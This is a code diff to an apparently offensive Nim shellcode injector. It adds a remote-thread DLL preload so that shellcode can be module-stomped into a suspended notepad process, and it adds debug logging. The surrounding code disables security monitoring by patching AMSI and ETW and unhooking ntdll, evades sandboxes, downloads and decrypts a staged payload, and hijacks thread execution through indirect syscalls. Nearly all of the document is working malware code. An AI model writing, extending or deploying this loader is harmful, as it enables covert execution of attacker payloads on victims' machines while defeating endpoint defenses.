@@ -111,7 +111,7 @@ when defined(threadHijack):
     pGetThreadContext: FnGetThreadContext = nil
     pSetThreadContext: FnSetThreadContext = nil
 
-# ReadProcessMemory is needed by moduleStomping to parse remote PE headers.
+# ReadProcessMemory and CreateRemoteThread are needed by moduleStomping.
 when defined(moduleStomping):
   type
     FnReadProcessMemory = proc(
@@ -119,7 +119,13 @@ when defined(moduleStomping):
       lpBuffer: pointer, nSize: SIZE_T,
       lpNumberOfBytesRead: ptr SIZE_T
     ): WINBOOL {.stdcall.}
+    FnCreateRemoteThread = proc(
+      hProcess: HANDLE, lpThreadAttributes: pointer, dwStackSize: SIZE_T,
+      lpStartAddress: pointer, lpParameter: LPVOID,
+      dwCreationFlags: DWORD, lpThreadId: ptr DWORD
+    ): HANDLE {.stdcall.}
   var pReadProcessMemory: FnReadProcessMemory = nil
+  var pCreateRemoteThread: FnCreateRemoteThread = nil
 
 # ---------------------------------------------------------------------------
 # Payload: embedded (base64) in default mode, downloaded at runtime in staged
@@ -352,7 +358,7 @@ when defined(moduleStomping):
 
     if candidate == nil: return nil
 
-    # RW → write shellcode → RX (never RWX, two separate VirtualProtectEx calls)
+    # RW -> write shellcode -> RX (never RWX, two separate VirtualProtectEx calls)
     var old: DWORD
     if pVirtualProtectEx(hProcess, candidate, SIZE_T(sc.len),
                           PAGE_READWRITE, addr old) == 0:
@@ -367,6 +373,26 @@ when defined(moduleStomping):
                          PAGE_EXECUTE_READ, addr old2) == 0:
       return nil
     return candidate
+
+  # Preload a large DLL into the target process so moduleStompInject has a
+  # viable candidate. In CREATE_SUSPENDED processes only ntdll/kernel32/kernelbase
+  # are present — all in the skip list. This forces a suitable DLL to be present.
+  proc preloadDllInProcess(hProc: HANDLE, dllPath: cstring) =
+    if pCreateRemoteThread == nil or pVirtualAllocEx == nil or
+       pWriteProcessMemory == nil: return
+    let pLoadLib = GetProcAddress(GetModuleHandleA("kernel32.dll"),
+                                  apiName("LoadLibraryA"))
+    if pLoadLib == nil: return
+    let pathLen = len($dllPath)
+    let sz = SIZE_T(pathLen + 1)
+    let remBuf = pVirtualAllocEx(hProc, nil, sz, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
+    if remBuf == nil: return
+    var written: SIZE_T
+    discard pWriteProcessMemory(hProc, remBuf, cast[pointer](dllPath), sz, addr written)
+    let hThread = pCreateRemoteThread(hProc, nil, 0, pLoadLib, remBuf, 0, nil)
+    if hThread != 0:
+      discard WaitForSingleObject(hThread, 5000)
+      discard CloseHandle(hThread)
 
 # ---------------------------------------------------------------------------
 # Halo's Gate: SSN resolver + indirect NtSetContextThread.
@@ -603,21 +629,36 @@ when defined(ppidSpoof):
 # ---------------------------------------------------------------------------
 # Main
 # ---------------------------------------------------------------------------
+when defined(debug):
+  proc dbg(s: string) =
+    writeLine(stdout, "[D] " & s)
+    flushFile(stdout)
+else:
+  template dbg(s: string) = discard
+
 proc hMain() =
+  dbg("hMain start")
+
   when defined(sandboxCheck):
-    if not doSandboxCheck(): return
+    if not doSandboxCheck():
+      dbg("sandbox check failed - exiting")
+      return
 
   when defined(unhook):
+    dbg("unhooking ntdll")
     unhookNtdll()
 
   when defined(etwPatch):
+    dbg("patching ETW")
     patchEtw()
 
   when defined(amsiPatch):
+    dbg("patching AMSI")
     patchAmsi()
 
   # Resolve ntdll syscalls at runtime (absent from static IAT)
   let hNtdll = GetModuleHandleA("ntdll.dll")
+  dbg("ntdll handle: " & $cast[uint](hNtdll))
 
   when not defined(threadHijack):
     pNtQueueApcThread = cast[FnNtQueueApcThread](
@@ -649,6 +690,8 @@ proc hMain() =
   when defined(moduleStomping):
     pReadProcessMemory = cast[FnReadProcessMemory](
       GetProcAddress(hK32, apiName("ReadProcessMemory")))
+    pCreateRemoteThread = cast[FnCreateRemoteThread](
+      GetProcAddress(hK32, apiName("CreateRemoteThread")))
 
   # Halo's Gate: resolve SSN for NtSetContextThread and locate the
   # syscall;ret gadget in ntdll .text for the indirect invocation path.
@@ -658,11 +701,17 @@ proc hMain() =
 
   # Load payload
   when defined(staged):
+    dbg("downloading staged payload")
     var sc = downloadStage()
-    if sc.len == 0: return
+    dbg("downloaded " & $sc.len & " bytes")
+    if sc.len == 0:
+      dbg("download failed - exiting")
+      return
     when defined(useRc4):
+      dbg("RC4 decrypt")
       rc4Crypt(rc4Key, sc)
     elif defined(useXor):
+      dbg("XOR decrypt")
       xorDecrypt(sc)
   else:
     let decoded = decode(encPayloadB64)
@@ -722,7 +771,10 @@ proc hMain() =
       nil, nil, addr si, addr pi
     )
 
-  if pi.hProcess == 0: return
+  dbg("CreateProcessW result: hProcess=" & $cast[uint](pi.hProcess) & " hThread=" & $cast[uint](pi.hThread))
+  if pi.hProcess == 0:
+    dbg("CreateProcessW failed - exiting")
+    return
 
   proc allocRemoteShellcode(hProc: HANDLE, pid: DWORD, payload: seq[byte]): LPVOID =
     when defined(moduleStomping):
@@ -747,10 +799,18 @@ proc hMain() =
       return nil
     return base
 
+  # Pre-load combase.dll so moduleStomping has a viable large .text candidate.
+  # A CREATE_SUSPENDED notepad only has ntdll/kernel32/kernelbase -- all in the
+  # skip list. combase.dll has a ~2MB .text section, large enough for any shellcode.
+  when defined(moduleStomping):
+    preloadDllInProcess(pi.hProcess, apiName("C:\\Windows\\System32\\combase.dll"))
+
   let remote = allocRemoteShellcode(pi.hProcess, pi.dwProcessId, sc)
+  dbg("remote shellcode addr: " & $cast[uint](remote))
   when defined(wipe):
     zeroMem(addr sc[0], sc.len)
   if remote == nil:
+    dbg("shellcode allocation failed - exiting")
     CloseHandle(pi.hThread)
     CloseHandle(pi.hProcess)
     return
@@ -761,28 +821,38 @@ proc hMain() =
     # CONTEXT_CONTROL is enough for RIP redirect and more reliable than CONTEXT_FULL.
     ctx.ContextFlags = CONTEXT_CONTROL
     if pGetThreadContext(pi.hThread, addr ctx) == 0:
+      dbg("GetThreadContext failed")
       CloseHandle(pi.hThread)
       CloseHandle(pi.hProcess)
       return
+    dbg("original RIP: " & $ctx.Rip)
     ctx.Rip = cast[DWORD64](remote)
     ctx.ContextFlags = CONTEXT_CONTROL
     var ctxOk = false
     when defined(haloGate):
+      dbg("haloGate SSN=" & $gSsnNtSetContextThread & " gadget=" & $cast[uint](gHaloGadget))
       if gSsnNtSetContextThread != 0xFFFF'u32 and gHaloGadget != nil:
         let st = indirectNtSetContextThread(
           gSsnNtSetContextThread, gHaloGadget, pi.hThread, addr ctx)
+        dbg("indirectNtSetContextThread status: " & $st)
         ctxOk = (st == 0)
     if not ctxOk:
+      dbg("fallback to SetThreadContext")
       ctxOk = pSetThreadContext(pi.hThread, addr ctx) != 0
+      dbg("SetThreadContext result: " & $ctxOk)
     if not ctxOk:
+      dbg("SetThreadContext failed - exiting")
       CloseHandle(pi.hThread)
       CloseHandle(pi.hProcess)
       return
+    dbg("ResumeThread")
     discard ResumeThread(pi.hThread)
   else:
+    dbg("NtQueueApcThread + ResumeThread")
     discard pNtQueueApcThread(pi.hThread, remote, nil, nil, nil)
     discard ResumeThread(pi.hThread)
 
+  dbg("injection complete - handles closed")
   CloseHandle(pi.hThread)
   CloseHandle(pi.hProcess)
 
